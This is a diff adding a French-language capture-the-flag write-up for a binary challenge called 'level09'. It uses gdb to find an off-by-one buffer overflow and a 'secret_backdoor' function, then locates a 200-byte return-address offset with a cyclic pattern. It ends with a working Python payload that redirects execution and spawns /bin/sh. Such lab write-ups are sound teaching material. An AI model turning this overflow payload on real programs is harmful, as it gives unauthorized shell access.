@@ -1,0 +1,51 @@
+En utilisant gdb on remarque une fonction secret_backdoor avec un appel à system et un buffer.
+On va donc exploiter un buffer overflow pour réecrire l'adresse de retour d'une fonction afin d'appeler secret_backdoor.
+
+On remarque auss que le programme copie 41 char dans un buffer de 40; il utilise aussi le nombre qui suit comme dernier paramètre du strncpy copiant ce buffer.
+Il est donc possible d'effectueur une buffer overflow afin de remplacer l'EIP par l'adresse de la fonction secret_backdoor.
+Ce qui nous permettra de lancer ce qu'il y a dans l'entrée d'user.
+
+On a donc déjà la première partie de l'exploit:
+
+python -c 'print "\xff" * 41 + "\n" + ......'
+
+On recherche maintenant l'adresse de la fonction secret_backdoor
+
+(gdb) info function secret_backdoor
+All functions matching regular expression "secret_backdoor":
+
+Non-debugging symbols:
+0x000055555555488c  secret_backdoor
+
+
+On doit donc trouver maintenant l'offset à partir duquel on peut écrire l'adresse de notre fonction.
+On utilise pournotre pattern generator préféré.
+
+gdb-peda$ r <<<$(python -c 'print "\xff" * 41 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"')
+
+Starting program: /home/khsadira/code/level09 <<<$(python -c 'print "\xff" * 41 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"')
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, >: Msg @Unix-Dude
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+[------------------------------------stack-------------------------------------]
+0000| 0x7ffffffedc08 ("6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4")
+0008| 0x7ffffffedc10 ("g9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4")
+0016| 0x7ffffffedc18 ("Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4")
+0024| 0x7ffffffedc20 ("4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4")
+0032| 0x7ffffffedc28 ("h7Ah8Ah9Ai0Ai1Ai2Ai3Ai4")
+0040| 0x7ffffffedc30 ("Ai0Ai1Ai2Ai3Ai4")
+0048| 0x7ffffffedc38 --> 0x34694133694132 ('2Ai3Ai4')
+0056| 0x7ffffffedc40 --> 0x0
+[------------------------------------------------------------------------------]
+
+On a donc notre offset à 200.
+
+On peut donc terminer notre exploit:
+
+python -c 'print "\xff" * 41 + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00\n/bin/sh"' > /tmp/level09
+cat /tmp/level09 - | ./level09
